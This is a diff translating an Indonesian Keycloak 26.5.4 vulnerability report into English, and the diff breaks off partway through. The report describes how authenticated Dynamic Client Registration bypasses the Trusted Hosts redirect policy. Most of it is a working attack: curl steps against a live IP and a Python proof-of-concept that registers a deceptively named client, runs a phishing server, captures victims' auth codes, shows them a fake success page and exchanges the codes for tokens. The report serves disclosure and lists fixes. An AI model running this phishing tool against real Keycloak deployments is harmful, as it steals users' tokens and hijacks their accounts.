@@ -1,91 +1,91 @@
-# Finding #5: DCR Trusted Hosts Bypass — Pencurian Token via Phishing Live
+# Finding #5: DCR Trusted Hosts Bypass — Live Token Theft via Phishing
 
 | Field | Value |
 |---|---|
 | **Severity** | HIGH (CVSS 8.0) |
-| **Versi Terdampak** | Keycloak 26.5.4 (stable terbaru, reproduksi terkonfirmasi) |
-| **Tipe Kerentanan** | Broken Access Control / Privilege Escalation via Client Registration Policy Bypass |
-| **Komponen Terdampak** | DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`), Client Registration Policy Engine |
-| **Tanggal Validasi** | 2026-02-21 |
-| **Peneliti** | Anggi Pradana |
+| **Affected Version** | Keycloak 26.5.4 (latest stable, reproduction confirmed) |
+| **Vulnerability Type** | Broken Access Control / Privilege Escalation via Client Registration Policy Bypass |
+| **Affected Components** | DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`), Client Registration Policy Engine |
+| **Validation Date** | 2026-02-21 |
+| **Researcher** | Anggi Pradana |
 
 ---
 
-## Ringkasan
+## Summary
 
-Dynamic Client Registration (DCR) policy "Trusted Hosts" hanya berlaku untuk registrasi anonymous. User yang punya role `create-client` (realm-management) bisa register OIDC client dengan `redirect_uris` apapun (termasuk ke server milik attacker) via authenticated DCR. Ini memungkinkan serangan phishing live: attacker generate URL phishing dari domain Keycloak asli, jalankan server penangkap, tunggu victim login, lalu otomatis curi token victim.
-
----
-
-## Konteks Konfigurasi
-
-Konfigurasi DCR policy default. Policy `Trusted Hosts` ada di subType `anonymous` tapi **tidak ada** di subType `authenticated`. Role `create-client` (realm-management) biasanya didelegasikan ke developer untuk self-service client registration.
+Dynamic Client Registration (DCR) policy "Trusted Hosts" only applies to anonymous registrations. A user with the `create-client` role (realm-management) can register an OIDC client with any `redirect_uris` (including to an attacker-controlled server) via authenticated DCR. This enables a live phishing attack: the attacker generates a phishing URL from the real Keycloak domain, runs a capture server, waits for the victim to login, then automatically steals the victim's token.
 
 ---
 
-## Deskripsi Detail
+## Configuration Context
 
-### Alur Serangan End-to-End
+Default DCR policy configuration. The `Trusted Hosts` policy exists in subType `anonymous` but is **absent** from subType `authenticated`. The `create-client` role (realm-management) is typically delegated to developers for self-service client registration.
+
+---
+
+## Detailed Description
+
+### End-to-End Attack Flow
 
 ```
-Attacker (punya role create-client)
+Attacker (has create-client role)
     │
-    ├─ 1. Login, dapat Bearer token
-    ├─ 2. Register client jahat via DCR (redirect_uri → server attacker)
-    ├─ 3. Generate URL phishing (domain Keycloak asli)
-    ├─ 4. Jalankan HTTP server penangkap auth code
-    ├─ 5. Kirim URL phishing ke victim
+    ├─ 1. Login, obtain Bearer token
+    ├─ 2. Register malicious client via DCR (redirect_uri → attacker's server)
+    ├─ 3. Generate phishing URL (real Keycloak domain)
+    ├─ 4. Start HTTP server to capture auth codes
+    ├─ 5. Send phishing URL to victim
     │
-    │  ┌─ Victim klik URL phishing
-    │  ├─ Melihat halaman login Keycloak ASLI (100% legitimate)
-    │  ├─ Login dengan kredensialnya
-    │  └─ Di-redirect ke server attacker (auth code terkirim)
+    │  ┌─ Victim clicks phishing URL
+    │  ├─ Sees the REAL Keycloak login page (100% legitimate)
+    │  ├─ Logs in with their credentials
+    │  └─ Redirected to attacker's server (auth code sent)
     │
-    ├─ 6. Server attacker tangkap auth code
-    ├─ 7. Tukar auth code → access token + refresh token victim
-    └─ 8. Akses penuh ke akun victim
+    ├─ 6. Attacker's server captures auth code
+    ├─ 7. Exchange auth code → access token + refresh token of victim
+    └─ 8. Full access to victim's account
 ```
 
-### Analisis Policy
+### Policy Analysis
 
-DCR endpoint Keycloak punya dua mode operasi:
+Keycloak's DCR endpoint has two modes of operation:
 
-- **`anonymous`** — Tanpa autentikasi; dilindungi policy "Trusted Hosts" yang validasi redirect URI.
-- **`authenticated`** — Butuh Bearer token; punya policy set terpisah.
+- **`anonymous`** — No authentication; protected by the "Trusted Hosts" policy which validates redirect URIs.
+- **`authenticated`** — Requires Bearer token; has a separate policy set.
 
-Policy `Trusted Hosts` (yang validasi `redirect_uris`) **hanya ada di subType `anonymous`**. SubType `authenticated` tidak punya validasi URI sama sekali.
+The `Trusted Hosts` policy (which validates `redirect_uris`) **only exists in subType `anonymous`**. SubType `authenticated` has no URI validation whatsoever.
 
 | Policy | subType `anonymous` | subType `authenticated` |
 |---|---|---|
-| Trusted Hosts (`client-uris-must-match`) | Diterapkan | **TIDAK ADA** |
-| Allowed Protocol Mapper Types | Diterapkan | Diterapkan |
-| Allowed Client Scopes | Diterapkan | Diterapkan |
-| Max Clients Limit | Diterapkan | Tidak ada |
-| Consent Required | Diterapkan | Tidak ada |
+| Trusted Hosts (`client-uris-must-match`) | Enforced | **ABSENT** |
+| Allowed Protocol Mapper Types | Enforced | Enforced |
+| Allowed Client Scopes | Enforced | Enforced |
+| Max Clients Limit | Enforced | Absent |
+| Consent Required | Enforced | Absent |
 
-### Verifikasi Privilege Boundary
+### Privilege Boundary Verification
 
-| Aksi | Endpoint | Hasil |
+| Action | Endpoint | Result |
 |---|---|---|
-| `create-client` role → DCR dengan redirect apapun | `/realms/{realm}/clients-registrations/openid-connect` | **201 Created (BERHASIL)** |
-| `create-client` role → Admin REST API | `/admin/realms/{realm}/clients` | **403 Forbidden (DITOLAK)** |
-| Anonymous DCR dengan redirect ke attacker | `/realms/{realm}/clients-registrations/openid-connect` | **403 "Trusted Hosts" rejected** |
+| `create-client` role → DCR with any redirect | `/realms/{realm}/clients-registrations/openid-connect` | **201 Created (SUCCESS)** |
+| `create-client` role → Admin REST API | `/admin/realms/{realm}/clients` | **403 Forbidden (BLOCKED)** |
+| Anonymous DCR with redirect to attacker | `/realms/{realm}/clients-registrations/openid-connect` | **403 "Trusted Hosts" rejected** |
 
-Client jahat yang terdaftar:
-- **Langsung aktif** — tidak perlu approval admin
-- **Fully functional** — bisa initiate authorization code flow
-- **Punya client secret** — attacker bisa tukar auth code jadi token
+The registered malicious client:
+- **Immediately active** — no admin approval needed
+- **Fully functional** — can initiate authorization code flow
+- **Has a client secret** — attacker can exchange auth code for tokens
 
 ---
 
-## Langkah Reproduksi
+## Steps to Reproduce
 
-**Prasyarat:**
+**Prerequisites:**
 - Realm: `test`
-- Attacker: `testuser / Password123` dengan role `create-client`
+- Attacker: `testuser / Password123` with `create-client` role
 - Victim: `victim / Password123`
 
-### Langkah 1 — Assign role create-client (setup admin)
+### Step 1 — Assign create-client role (admin setup)
 
 ```bash
 ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
@@ -109,7 +109,7 @@ curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
   "http://46.101.162.187:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
 ```
 
-### Langkah 2 — Attacker login dan dapat token
+### Step 2 — Attacker login and obtain token
 
 ```bash
 ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
@@ -117,7 +117,7 @@ ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol
   | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
 ```
 
-### Langkah 3 — Register client jahat dengan redirect ke server attacker
+### Step 3 — Register malicious client with redirect to attacker's server
 
 ```bash
 REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
@@ -132,7 +132,7 @@ REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-regist
 echo "$REG_RESP" | python3 -m json.tool
 ```
 
-**Response (201 Created — TANPA penolakan Trusted Hosts):**
+**Response (201 Created — WITHOUT Trusted Hosts rejection):**
 
 ```json
 {
@@ -143,7 +143,7 @@ echo "$REG_RESP" | python3 -m json.tool
 }
 ```
 
-### Langkah 4 — Kontrol: Anonymous DCR (benar ditolak)
+### Step 4 — Control: Anonymous DCR (correctly rejected)
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
@@ -158,9 +158,9 @@ curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/ope
 }
 ```
 
-### Langkah 5 — Jalankan server penangkap auth code + Buat URL phishing
+### Step 5 — Start auth code capture server + Generate phishing URL
 
-Attacker jalankan server HTTP listener lalu generate URL phishing:
+Attacker starts an HTTP listener server then generates the phishing URL:
 
 ```
 http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
@@ -170,37 +170,37 @@ http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
   scope=openid+profile+email
 ```
 
-URL ini 100% legitimate — domain Keycloak asli. Victim tidak mungkin curiga.
+This URL is 100% legitimate — real Keycloak domain. The victim has no reason to be suspicious.
 
-### Langkah 6 — Victim klik URL, login, auth code tertangkap
+### Step 6 — Victim clicks URL, logs in, auth code captured
 
-Victim melihat halaman login Keycloak asli. Setelah login, Keycloak redirect ke server attacker:
+Victim sees the real Keycloak login page. After logging in, Keycloak redirects to the attacker's server:
 
 ```
 HTTP 302 → http://46.101.162.187:48888/callback?code=7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
 ```
 
-Server attacker otomatis menangkap auth code dan menampilkan halaman "Login Berhasil!" palsu ke victim.
+The attacker's server automatically captures the auth code and displays a fake "Login Successful!" page to the victim.
 
-### Langkah 7 — Attacker tukar auth code → token victim
+### Step 7 — Attacker exchanges auth code → victim's token
 
 ```bash
 curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
   -d "client_id=425bebcb-...&client_secret=YDEWNkAW...&grant_type=authorization_code&code=7e7cad47-...&redirect_uri=http%3A%2F%2F46.101.162.187%3A48888%2Fcallback"
 ```
 
-**Token victim berhasil dicuri:**
+**Victim's token successfully stolen:**
 
 ```
 Username     : victim
 Email        : victim@test.com
-Nama Lengkap: Victim User
+Full Name    : Victim User
 Scope        : openid profile email
 Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
 Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...
 ```
 
-### Langkah 8 — Verifikasi: akses data victim
+### Step 8 — Verify: access victim data
 
 ```bash
 curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
@@ -218,63 +218,63 @@ curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo 
 
 ---
 
-## Dampak
+## Impact
 
-- **Pencurian token lengkap:** User dengan role `create-client` bisa mencuri token user manapun di realm, termasuk administrator, dengan register client jahat dan phishing via halaman login Keycloak asli.
-- **Tidak ada indikator kompromi untuk victim:** Halaman login ada di domain Keycloak asli dengan HTTPS. Tidak ada elemen UI mencurigakan, tidak ada warning browser.
-- **Akses persisten:** Refresh token yang dicuri memberikan akses berkelanjutan sampai victim ganti password.
-- **Bypass semua redirect_uri allowlisting:** Proteksi `Trusted Hosts` yang dikonfigurasi admin tidak berlaku untuk authenticated DCR.
-- **Skala ke semua user di realm:** Satu registrasi client jahat bisa phishing semua user. Attacker hanya perlu distribusi URL.
-
----
-
-## Rekomendasi
-
-1. **Terapkan policy `Trusted Hosts` ke subType `authenticated`.** Validasi URI yang sama harus diterapkan untuk registrasi authenticated. Ini perbaikan utama.
-2. **Wajibkan approval admin untuk client DCR.** Tambah policy `client-disabled` ke subType authenticated agar client baru butuh aktivasi admin sebelum bisa initiate auth flow.
-3. **Tambah validasi domain URI ke policy set `authenticated`.** Batasi `redirect_uris` ke domain yang sudah di-approve.
-4. **Audit client yang sudah terdaftar via DCR** untuk redirect URI yang tidak seharusnya.
+- **Full token theft:** A user with the `create-client` role can steal the token of any user in the realm, including administrators, by registering a malicious client and phishing via the real Keycloak login page.
+- **No compromise indicators for the victim:** The login page is on the real Keycloak domain with HTTPS. There are no suspicious UI elements, no browser warnings.
+- **Persistent access:** The stolen refresh token provides ongoing access until the victim changes their password.
+- **Bypasses all redirect_uri allowlisting:** The `Trusted Hosts` protection configured by the admin does not apply to authenticated DCR.
+- **Scales to all users in the realm:** A single malicious client registration can phish all users. The attacker only needs to distribute the URL.
 
 ---
 
-## Proof of Concept — Source Code Lengkap
+## Recommendations
+
+1. **Apply the `Trusted Hosts` policy to subType `authenticated`.** The same URI validation must be enforced for authenticated registrations. This is the primary fix.
+2. **Require admin approval for DCR clients.** Add a `client-disabled` policy to the authenticated subType so new clients require admin activation before they can initiate auth flows.
+3. **Add URI domain validation to the `authenticated` policy set.** Restrict `redirect_uris` to pre-approved domains.
+4. **Audit clients already registered via DCR** for redirect URIs that should not be there.
+
+---
+
+## Proof of Concept — Full Source Code
 
 **File:** `pocs/poc_f5_dcr_hijack.py`
 
-**Penggunaan:**
+**Usage:**
 
 ```bash
-# Mode interaktif (tunggu victim buka URL di browser):
+# Interactive mode (wait for victim to open URL in browser):
 python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888
 
-# Mode otomatis (simulasi victim untuk testing):
+# Automated mode (simulate victim for testing):
 python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --auto-victim --timeout 30
 ```
 
-**Parameter:**
-- `--host` — URL Keycloak (default: http://46.101.162.187:8080)
-- `--listen-port` — Port server phishing attacker (default: 48888)
+**Parameters:**
+- `--host` — Keycloak URL (default: http://46.101.162.187:8080)
+- `--listen-port` — Attacker's phishing server port (default: 48888)
 - `--realm` — Target realm (default: test)
-- `--timeout` — Timeout menunggu victim dalam detik (default: 300)
-- `--auto-victim` — Otomatis simulasi victim login (untuk testing/CI)
+- `--timeout` — Timeout waiting for victim in seconds (default: 300)
+- `--auto-victim` — Automatically simulate victim login (for testing/CI)
 
 **Source:**
 
 ```python
 #!/usr/bin/env python3
 """
-Finding #5: DCR Trusted Hosts Bypass — Serangan Phishing Live + Pencurian Token
+Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack + Token Theft
 Severity: HIGH (CVSS 8.0)
 Target: Keycloak 26.5.4
 
-Serangan otomatis end-to-end:
-1. Register client jahat via authenticated DCR (bypass Trusted Hosts)
-2. Generate URL phishing yang siap kirim ke victim
-3. Jalankan server HTTP listener, tunggu victim klik & login
-4. Tangkap auth code dari redirect, tukar jadi token victim
-5. Tampilkan data victim yang berhasil dicuri
+Automated end-to-end attack:
+1. Register malicious client via authenticated DCR (bypasses Trusted Hosts)
+2. Generate ready-to-send phishing URL
+3. Start HTTP listener server, wait for victim to click & log in
+4. Capture auth code from redirect, exchange for victim's tokens
+5. Display stolen victim data
 
-Penggunaan:
+Usage:
   python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080
   python3 poc_f5_dcr_hijack.py --host http://46.101.162.187:8080 --listen-port 48888 --timeout 600
 """
@@ -291,7 +291,7 @@ import time
 import threading
 import urllib.parse
 
-# ═══ Warna ANSI ═══
+# ═══ ANSI Colors ═══
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -303,7 +303,7 @@ BOLD = "\033[1m"
 DIM = "\033[2m"
 RESET = "\033[0m"
 
-# ═══ Global: simpan auth code yang ditangkap ═══
+# ═══ Global: store captured auth code ═══
 captured_code = None
 captured_event = threading.Event()
 
@@ -312,29 +312,29 @@ def banner():
     print(f"""
 {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
 ║  Finding #5: DCR Trusted Hosts Bypass                        ║
-║  Serangan Phishing Live — Pencurian Token Otomatis           ║
+║  Live Phishing Attack — Automated Token Theft                ║
 ║  Keycloak 26.5.4 — CVSS 8.0 (HIGH)                         ║
 ╚══════════════════════════════════════════════════════════════╝{RESET}
 """)
 
 
-def langkah(n, msg):
-    print(f"\n{BOLD}{CYAN}[Langkah {n}]{RESET} {BOLD}{msg}{RESET}")
+def step(n, msg):
+    print(f"\n{BOLD}{CYAN}[Step {n}]{RESET} {BOLD}{msg}{RESET}")
 
 
-def sukses(msg):
-    print(f"  {GREEN}[✓]{RESET} {msg}")
+def success(msg):
+    print(f"  {GREEN}[+]{RESET} {msg}")
 
 
-def gagal(msg):
-    print(f"  {RED}[✗]{RESET} {msg}")
+def fail(msg):
+    print(f"  {RED}[-]{RESET} {msg}")
 
 
 def info(msg):
     print(f"  {BLUE}[*]{RESET} {msg}")
 
 
-def peringatan(msg):
+def warn(msg):
     print(f"  {YELLOW}[!]{RESET} {msg}")
 
 
@@ -393,7 +393,7 @@ def http_get_json(host, port, path, token=None):
 
 
 def get_admin_token(port):
-    """Ambil admin token via localhost"""
+    """Get admin token via localhost"""
     status, data = http_post_form("localhost", port,
         "/realms/master/protocol/openid-connect/token",
         {"client_id": "admin-cli", "grant_type": "password",
@@ -402,16 +402,16 @@ def get_admin_token(port):
 
 
 def decode_jwt(token):
-    """Decode JWT payload tanpa verifikasi"""
+    """Decode JWT payload without verification"""
     payload = token.split(".")[1]
     payload += "=" * (4 - len(payload) % 4)
     return json.loads(base64.b64decode(payload))
 
 
-# ═══ Server Phishing (Tangkap Auth Code dari Victim) ═══
+# ═══ Phishing Server (Captures Auth Code from Victim) ═══
 
 class PhishingHandler(http.server.BaseHTTPRequestHandler):
-    """Handler HTTP yang menangkap auth code dari redirect Keycloak."""
+    """HTTP handler that captures auth code from Keycloak redirect."""
 
     def do_GET(self):
         global captured_code
@@ -420,12 +420,12 @@ class PhishingHandler(http.server.BaseHTTPRequestHandler):
         if "code" in params:
             captured_code = params["code"][0]
 
-            # Tampilkan halaman palsu ke victim — terlihat seperti login berhasil
+            # Show fake "success" page to victim
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.end_headers()
             html = """<!DOCTYPE html>
-<html lang="id"><head><meta charset="utf-8"><title>Login Berhasil</title>
+<html><head><meta charset="utf-8"><title>Login Successful</title>
 <style>
   body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          text-align: center; padding: 60px 20px; background: #f0f2f5; color: #333; }
@@ -438,32 +438,33 @@ class PhishingHandler(http.server.BaseHTTPRequestHandler):
 </style></head><body>
 <div class="card">
   <div class="icon">&#10004;</div>
-  <h2>Login Berhasil!</h2>
-  <p>Anda telah berhasil masuk ke aplikasi.</p>
-  <p class="small">Halaman ini dapat ditutup.</p>
+  <h2>Login Successful!</h2>
+  <p>You have been successfully signed in.</p>
+  <p class="small">You may close this page.</p>
 </div></body></html>"""
             self.wfile.write(html.encode())
 
-            # Beritahu terminal attacker
+            # Notify attacker terminal
             print(f"\n  {RED}{BOLD}{'=' * 55}{RESET}")
-            print(f"  {RED}{BOLD}  *** AUTH CODE VICTIM TERTANGKAP! ***{RESET}")
+            print(f"  {RED}{BOLD}  *** VICTIM AUTH CODE CAPTURED! ***{RESET}")
             print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
             print(f"  {RED}  Code: {captured_code[:50]}...{RESET}")
             print(f"  {RED}{BOLD}{'=' * 55}{RESET}")
 
             captured_event.set()
         else:
+            # Other requests (favicon, etc.)
             self.send_response(200)
             self.send_header("Content-Type", "text/html")
             self.end_headers()
             self.wfile.write(b"<html><body>Loading...</body></html>")
 
     def log_message(self, format, *args):
-        pass
+        pass  # Suppress default logging
 
 
-def mulai_server_phishing(port):
-    """Jalankan HTTP server di background thread."""
+def start_phishing_server(port):
+    """Start HTTP server on background thread."""
     class ReusableServer(http.server.HTTPServer):
         allow_reuse_address = True
         def server_bind(self):
@@ -480,17 +481,17 @@ def mulai_server_phishing(port):
 
 def main():
     parser = argparse.ArgumentParser(
-        description="PoC Finding #5: DCR Trusted Hosts Bypass — Serangan Phishing Live")
+        description="PoC Finding #5: DCR Trusted Hosts Bypass — Live Phishing Attack")
     parser.add_argument("--host", default="http://46.101.162.187:8080",
-                        help="URL Keycloak (default: http://46.101.162.187:8080)")
+                        help="Keycloak URL (default: http://46.101.162.187:8080)")
     parser.add_argument("--listen-port", type=int, default=48888,
-                        help="Port untuk server phishing attacker (default: 48888)")
+                        help="Port for attacker phishing server (default: 48888)")
     parser.add_argument("--realm", default="test",
                         help="Target realm (default: test)")
     parser.add_argument("--timeout", type=int, default=300,
-                        help="Timeout menunggu victim dalam detik (default: 300)")
+                        help="Timeout waiting for victim in seconds (default: 300)")
     parser.add_argument("--auto-victim", action="store_true",
-                        help="Otomatis simulasi victim login (untuk testing/CI)")
+                        help="Automatically simulate victim login (for testing/CI)")
     args = parser.parse_args()
 
     # Parse host
@@ -501,28 +502,28 @@ def main():
     listen_port = args.listen_port
     realm = args.realm
     callback_url = f"http://{public_ip}:{listen_port}/callback"
-    hasil = []
+    results = []
 
     banner()
-    info(f"Target Keycloak : {kc_host}:{kc_port}")
-    info(f"Server phishing : {public_ip}:{listen_port}")
-    info(f"Timeout victim  : {args.timeout} detik")
+    info(f"Target Keycloak  : {kc_host}:{kc_port}")
+    info(f"Phishing server  : {public_ip}:{listen_port}")
+    info(f"Victim timeout   : {args.timeout}s")
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 0: Setup
+    # STEP 0: Setup — Ensure testuser has create-client role
     # ══════════════════════════════════════════════════════════════
-    langkah(0, "Setup — Assign role create-client ke testuser")
+    step(0, "Setup — Assign create-client role to testuser")
 
     admin_token = get_admin_token(kc_port)
     if not admin_token:
-        gagal("Gagal dapat admin token! Pastikan Keycloak berjalan.")
+        fail("Failed to get admin token! Ensure Keycloak is running.")
         return 1
-    sukses("Admin token OK")
+    success("Admin token OK")
 
     _, users = http_get_json("localhost", kc_port,
         f"/admin/realms/{realm}/users?username=testuser", admin_token)
     if not users or not isinstance(users, list) or len(users) == 0:
-        gagal("testuser tidak ditemukan!")
+        fail("testuser not found! Create it in Admin Console first.")
         return 1
     user_id = users[0]["id"]
     info(f"testuser ID: {user_id}")
@@ -537,12 +538,12 @@ def main():
     http_post_json("localhost", kc_port,
         f"/admin/realms/{realm}/users/{user_id}/role-mappings/clients/{rm_client_id}",
         [create_role], admin_token)
-    sukses("Role create-client berhasil di-assign ke testuser")
+    success("create-client role assigned to testuser")
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 1: Attacker login
+    # STEP 1: Attacker login
     # ══════════════════════════════════════════════════════════════
-    langkah(1, "ATTACKER — Login sebagai testuser (punya role create-client)")
+    step(1, "ATTACKER — Login as testuser (has create-client role)")
 
     status, data = http_post_form(kc_host, kc_port,
         f"/realms/{realm}/protocol/openid-connect/token",
@@ -551,19 +552,19 @@ def main():
 
     attacker_token = data.get("access_token", "")
     if not attacker_token:
-        gagal(f"Login gagal: {data}")
+        fail(f"Login failed: {data}")
         return 1
-    sukses(f"Login berhasil — token: {attacker_token[:40]}...")
+    success(f"Login successful — token: {attacker_token[:40]}...")
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 2: Register client jahat
+    # STEP 2: Register malicious client via authenticated DCR
     # ══════════════════════════════════════════════════════════════
-    langkah(2, "ATTACKER — Register client jahat via Dynamic Client Registration")
+    step(2, "ATTACKER — Register malicious client via Dynamic Client Registration")
 
-    info(f"Redirect URI ke server attacker: {callback_url}")
+    info(f"Redirect URI to attacker server: {callback_url}")
 
     dcr_data = {
-        "client_name": "Aplikasi Resmi Perusahaan",
+        "client_name": "Official Company App",
         "redirect_uris": [callback_url],
         "grant_types": ["authorization_code", "refresh_token"],
         "response_types": ["code"],
@@ -575,24 +576,24 @@ def main():
         dcr_data, attacker_token)
 
     if "client_id" not in reg_resp:
-        gagal(f"DCR gagal (HTTP {status}): {reg_resp}")
+        fail(f"DCR failed (HTTP {status}): {reg_resp}")
         return 1
 
     mal_client_id = reg_resp["client_id"]
     mal_secret = reg_resp.get("client_secret", "")
 
-    sukses("Client jahat BERHASIL terdaftar!")
+    success("Malicious client REGISTERED successfully!")
     print(f"    {MAGENTA}Client ID     : {mal_client_id}{RESET}")
     print(f"    {MAGENTA}Client Secret : {mal_secret}{RESET}")
     print(f"    {MAGENTA}Redirect URI  : {callback_url}{RESET}")
-    print(f"    {MAGENTA}Nama Client   : Aplikasi Resmi Perusahaan{RESET}")
-    peringatan("Trusted Hosts policy TIDAK berlaku untuk authenticated DCR!")
-    hasil.append(("DCR bypass (register client jahat)", True))
+    print(f"    {MAGENTA}Client Name   : Official Company App{RESET}")
+    warn("Trusted Hosts policy NOT enforced for authenticated DCR!")
+    results.append(("DCR bypass (malicious client registered)", True))
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 3: Kontrol — Anonymous DCR
+    # STEP 3: Control — Anonymous DCR should be blocked
     # ══════════════════════════════════════════════════════════════
-    langkah(3, "KONTROL — Anonymous DCR (tanpa autentikasi)")
+    step(3, "CONTROL — Anonymous DCR (no authentication)")
 
     status, anon_resp = http_post_json(kc_host, kc_port,
         f"/realms/{realm}/clients-registrations/openid-connect",
@@ -600,27 +601,27 @@ def main():
 
     anon_desc = anon_resp.get("error_description", anon_resp.get("error", str(anon_resp)))
     if status == 403 or "Trusted Hosts" in str(anon_resp):
-        sukses(f"Anonymous DCR DITOLAK (benar): {anon_desc[:80]}")
-        hasil.append(("Kontrol: Anonymous DCR ditolak", True))
+        success(f"Anonymous DCR BLOCKED (correct): {anon_desc[:80]}")
+        results.append(("Control: Anonymous DCR blocked", True))
     else:
-        peringatan(f"Anonymous DCR tidak ditolak (HTTP {status})")
-        hasil.append(("Kontrol: Anonymous DCR ditolak", False))
+        warn(f"Anonymous DCR not blocked (HTTP {status})")
+        results.append(("Control: Anonymous DCR blocked", False))
 
-    info("Policy gap terkonfirmasi: Anonymous=DITOLAK, Authenticated=LOLOS")
-
-    # ══════════════════════════════════════════════════════════════
-    # LANGKAH 4: Jalankan server phishing
-    # ══════════════════════════════════════════════════════════════
-    langkah(4, "ATTACKER — Jalankan server phishing (penangkap auth code)")
-
-    server = mulai_server_phishing(listen_port)
-    sukses(f"Server phishing aktif di 0.0.0.0:{listen_port}")
-    info("Server akan menangkap auth code saat victim di-redirect kesini")
+    info("Policy gap confirmed: Anonymous=BLOCKED, Authenticated=ALLOWED")
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 5: Generate URL phishing
+    # STEP 4: Start phishing server
     # ══════════════════════════════════════════════════════════════
-    langkah(5, "ATTACKER — Buat URL phishing")
+    step(4, "ATTACKER — Start phishing server (auth code catcher)")
+
+    server = start_phishing_server(listen_port)
+    success(f"Phishing server active on 0.0.0.0:{listen_port}")
+    info("Server will capture auth code when victim is redirected here")
+
+    # ══════════════════════════════════════════════════════════════
+    # STEP 5: Generate phishing URL
+    # ══════════════════════════════════════════════════════════════
+    step(5, "ATTACKER — Generate phishing URL")
 
     phishing_url = (
         f"http://{public_ip}:{kc_port}/realms/{realm}/protocol/openid-connect/auth"
@@ -632,36 +633,37 @@ def main():
 
     print(f"""
   {RED}{BOLD}╔══════════════════════════════════════════════════════════════╗
-  ║                 URL PHISHING SIAP KIRIM                      ║
+  ║              PHISHING URL READY TO SEND                      ║
   ╚══════════════════════════════════════════════════════════════╝{RESET}
 
-  {BOLD}{WHITE}Kirim URL berikut ke target victim:{RESET}
+  {BOLD}{WHITE}Send this URL to the target victim:{RESET}
 
   {CYAN}{BOLD}{phishing_url}{RESET}
 
-  {YELLOW}> URL ini terlihat 100% legitimate (domain Keycloak asli)
-  > Victim akan melihat halaman login Keycloak yang asli
-  > Setelah login, auth code otomatis dikirim ke server kita
-  > Victim melihat halaman "Login Berhasil" yang palsu{RESET}
+  {YELLOW}> This URL looks 100% legitimate (real Keycloak domain)
+  > Victim will see the real Keycloak login page
+  > After login, auth code is automatically sent to our server
+  > Victim sees a fake "Login Successful" page{RESET}
 
-  {BOLD}Menunggu victim mengklik URL dan login...{RESET}
-  {DIM}(Buka URL di atas di browser untuk simulasi victim){RESET}
-  {DIM}Timeout: {args.timeout} detik{RESET}
+  {BOLD}Waiting for victim to click the URL and log in...{RESET}
+  {DIM}(Open the URL above in a browser to simulate victim){RESET}
+  {DIM}Timeout: {args.timeout}s{RESET}
 """)
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 6: Tunggu victim
+    # STEP 6: Wait for victim
     # ══════════════════════════════════════════════════════════════
-    langkah(6, f"Menunggu victim login... (timeout {args.timeout}s)")
+    step(6, f"Waiting for victim to log in... (timeout {args.timeout}s)")
 
     if args.auto_victim:
-        info("Mode --auto-victim: simulasi victim login otomatis...")
+        info("--auto-victim mode: automatically simulating victim login...")
         victim_thread = threading.Thread(
-            target=simulasi_victim_login,
+            target=simulate_victim_login,
             args=(kc_host, kc_port, realm, mal_client_id, callback_url),
             daemon=True)
         victim_thread.start()
 
+    # Waiting animation
     start_time = time.time()
     spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
     idx = 0
@@ -671,27 +673,28 @@ def main():
         if remaining <= 0:
             break
         print(f"\r  {YELLOW}{spinner[idx % len(spinner)]}{RESET} "
-              f"Menunggu victim... ({elapsed}s / {args.timeout}s) "
-              f"— Buka URL di browser untuk simulasi", end="", flush=True)
+              f"Waiting for victim... ({elapsed}s / {args.timeout}s) "
+              f"— Open URL in browser to simulate", end="", flush=True)
         idx += 1
         captured_event.wait(timeout=0.3)
 
-    print("\r" + " " * 80 + "\r", end="")
+    print("\r" + " " * 80 + "\r", end="")  # Clear spinner line
 
     if not captured_code:
-        gagal(f"Timeout — tidak ada victim yang login dalam {args.timeout} detik")
+        fail(f"Timeout — no victim logged in within {args.timeout} seconds")
+        print(f"\n  {YELLOW}Tip: Open the phishing URL in a browser, login as victim/Password123{RESET}")
         server.shutdown()
-        print_ringkasan(hasil)
+        print_summary(results)
         return 1
 
-    sukses("Auth code victim berhasil ditangkap!")
+    success("Victim auth code captured!")
     info(f"Auth code: {captured_code[:50]}...")
-    hasil.append(("Auth code tertangkap via redirect", True))
+    results.append(("Auth code captured via redirect", True))
 
     # ══════════════════════════════════════════════════════════════
-    # LANGKAH 7: Tukar auth code → token victim
